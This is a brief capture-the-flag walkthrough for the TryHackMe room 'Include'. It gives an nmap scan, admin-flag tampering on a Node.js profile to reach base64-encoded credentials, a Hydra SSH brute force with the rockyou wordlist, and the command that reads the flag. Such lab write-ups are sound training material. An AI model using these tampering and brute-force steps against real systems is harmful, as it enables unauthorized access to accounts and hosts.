# Include

## TASK: Scan

### Nmap Scan
```bash
nmap 10.80.163.206 -sV -Pn -p- -T4
```
#### Output:
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
```

---

## TASK: Port 4000

1. Navigate to port 4000 and log in with provided info on the webpage.
2. Add the `isAdmin` parameter to `true` in the Profile tab.
3. Go to the emerged API tab and paste the second provided GET Admins API in the Settings tab.
4. Retrieve the username and password at the Settings Tab for port 50000, through base64 decode.

---

## TASK: Port 50000

1. Log in to System Monitoring (port 50000).
2. Enter the credentials retrieved from port 4000.

---

## TASK: SSH

1. Add `joshua` and `charles` into `user.txt`.
2. Use Hydra to brute force SSH:
```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://10.80.163.206
```
3. Both passwords are `123456`.
4. Retrieve the flag:
```bash
cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
```

---

## Appendix

Refer to the TryHackMe room for more details.